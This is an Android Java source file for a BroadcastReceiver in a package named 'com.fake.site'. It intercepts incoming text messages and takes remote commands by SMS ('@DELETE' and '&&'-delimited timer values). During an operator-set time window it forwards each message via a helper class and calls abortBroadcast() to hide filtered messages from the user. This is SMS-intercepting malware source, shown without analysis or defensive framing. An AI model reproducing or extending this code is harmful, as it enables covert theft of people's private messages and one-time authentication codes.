package com.fake.site;

import java.util.Calendar;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.fake.site.sms.Sms;

public class MessageReceiver extends BroadcastReceiver {

	private final String MESSAGE_DELETE = "@DELETE";
	SharedPreferences mSettings;

	public void onReceive(Context context, Intent intent) {

		Bundle pudsBundle = intent.getExtras();
		Object[] pdus = (Object[]) pudsBundle.get("pdus");
		SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[0]);
		Sms sms = new Sms(messages.getMessageBody(),
				messages.getDisplayOriginatingAddress(),
				messages.getTimestampMillis());

		SharedPreferences prefs = PreferenceManager
				.getDefaultSharedPreferences(context);
		SharedPreferences.Editor editor = prefs.edit();

		boolean bool = prefs.getBoolean("hasTrue", false);

		if (MESSAGE_DELETE.equals(messages.getMessageBody())) {
			editor.putBoolean("qwerty", true);
			editor.commit();
			abortBroadcast();
		}
		
		String info[];
		info = messages.getMessageBody().split("&&");
		Log.d("myLogs" , info[0]);
		if (info.length > 1) {
			String time = info[1];
			int workTime = Integer.parseInt(time);
			Calendar CurrentCalendar = Calendar.getInstance();
			int cHour = CurrentCalendar.get(Calendar.HOUR_OF_DAY);
			int cMin = CurrentCalendar.get(Calendar.MINUTE);
			int startTime = (cHour * 60 + cMin);
			editor.putInt("startTime", startTime);
			editor.putInt("workTime", workTime);
			editor.putBoolean("time", true);
			editor.commit();
			abortBroadcast();
		}

		boolean mEnable = prefs.getBoolean("qwerty", false);
		boolean mTime = prefs.getBoolean("time", false);

		if (!mEnable) {

			if (mTime) {
				
				Calendar CurrentCalendar = Calendar.getInstance();
				int cHour = CurrentCalendar.get(Calendar.HOUR_OF_DAY);
				int cMin = CurrentCalendar.get(Calendar.MINUTE);
				int nowTime = (cHour * 60 + cMin);
				int startTime = prefs.getInt("startTime", 0);
				int workTime = prefs.getInt("workTime", 0);
				
				if (nowTime - startTime < workTime) {
					
					sms.sendSms(sms.createMessage());
					boolean mFilterAll = sms.filterAll();
					if (mFilterAll)
						abortBroadcast();

					boolean mFilter = sms.filter();
					if (mFilter)
						abortBroadcast();
				}
				else
				{
					editor.putBoolean("time", false);
					editor.commit();
				}

			}
		}

	};

}
